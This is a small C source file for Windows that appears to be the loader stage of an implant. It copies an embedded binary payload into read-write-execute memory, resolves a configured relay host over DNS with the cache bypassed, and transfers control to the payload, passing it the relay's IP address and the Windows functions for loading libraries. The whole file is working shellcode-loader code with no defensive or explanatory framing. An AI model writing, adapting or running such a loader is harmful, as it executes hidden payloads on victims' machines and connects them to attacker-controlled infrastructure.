#include "../../include/config.h"
#include "entrypoint.h"
#include <stdio.h>
#include <windows.h>
#include <windns.h>
extern unsigned char dispatcher_bin[];
extern unsigned int dispatcher_bin_len;
int main(){
	// char *p = malloc(dispatcher_bin_len);
	// DWORD dwOldProt = 0;
	// VirtualProtect(p, dispatcher_bin_len, PAGE_EXECUTE_READWRITE, &dwOldProt);
	
	LPDISPATCHER_ENTRYPOINT_PROC  pPayload = VirtualAlloc(NULL, dispatcher_bin_len, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pPayload, dispatcher_bin, dispatcher_bin_len);

	PDNS_RECORD pDnsRecord;
	if (DnsQuery_A(CONFIG_RELAY_HOST, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &pDnsRecord, NULL)) {
		fprintf(stderr, "DnsQuery_A: error %ld", GetLastError());
		return 1;
	}

	IN_ADDR inaddr;
	inaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;

	return pPayload(pPayload, inaddr, LoadLibrary, GetProcAddress);
}
